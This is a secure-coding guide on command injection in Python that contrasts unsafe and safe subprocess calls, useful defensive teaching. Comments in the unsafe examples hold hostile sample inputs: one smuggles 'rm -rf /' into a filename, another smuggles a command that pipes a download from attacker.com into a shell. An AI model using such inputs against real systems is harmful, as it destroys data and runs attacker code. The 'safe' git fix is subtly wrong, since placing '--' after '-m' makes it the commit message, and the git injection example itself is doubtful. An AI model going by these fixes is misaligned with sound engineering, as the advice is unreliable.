---
title: Prevent Command Injection — Never Pass User Input Through Shell Interpretation
impact: CRITICAL
impactDescription: Command injection gives attackers full system access — equivalent to SSH as the application user
tags: command-injection, shell, subprocess, exec, os-command, rce
---

## Prevent Command Injection — Never Pass User Input Through Shell Interpretation

Command injection occurs when user-controlled data is passed to system command execution functions with shell interpretation enabled. Even without shell interpretation, argument injection can occur when filenames starting with `-` are interpreted as flags by utilities like `git`, `curl`, and `ffmpeg`.

**Incorrect (shell interpretation with user data and argument injection):**

```python
import os
import subprocess

# Direct command injection via shell=True
def convert_image(filename: str):
    os.system(f"convert {filename} output.png")
    # filename = "image.png; rm -rf /" executes destructive command

# Argument injection without shell — still dangerous
def commit_file(message: str):
    subprocess.run(["git", "commit", "-m", message])
    # message = "--allow-empty -m 'injected'" adds unexpected flags

# Indirect injection via environment
def run_build(project_dir: str):
    env = os.environ.copy()
    env["PROJECT_DIR"] = project_dir
    subprocess.run("cd $PROJECT_DIR && make", shell=True, env=env)
    # project_dir = "; curl attacker.com | sh #" injects commands
```

**Correct (avoid shell, validate arguments, use allowlists):**

```python
import subprocess
import shlex
from pathlib import Path

# Safe: list form avoids shell interpretation entirely
def convert_image(filename: str):
    # Validate filename is a real path with expected extension
    path = Path(filename).resolve()
    if not path.suffix.lower() in {".png", ".jpg", ".gif"}:
        raise ValueError("Invalid image format")
    if not path.is_relative_to(UPLOAD_DIR):
        raise ValueError("Path traversal attempt")
    subprocess.run(["convert", str(path), "output.png"], check=True)

# Safe: prefix "--" to prevent argument injection
def commit_file(message: str):
    subprocess.run(["git", "commit", "-m", "--", message], check=True)

# Safe: no shell, direct list execution, validated path
def run_build(project_dir: str):
    path = Path(project_dir).resolve()
    if not path.is_relative_to(ALLOWED_PROJECTS_DIR):
        raise ValueError("Invalid project directory")
    subprocess.run(["make"], cwd=str(path), check=True)
```

Language-specific dangerous functions: Python `eval()`/`exec()`/`pickle.loads()`, Ruby `system()`/backticks, PHP `system()`/`exec()`/`passthru()`, Node.js `child_process.exec()`/`eval()`/`Function()`, Go `os/exec` with shell invocation.
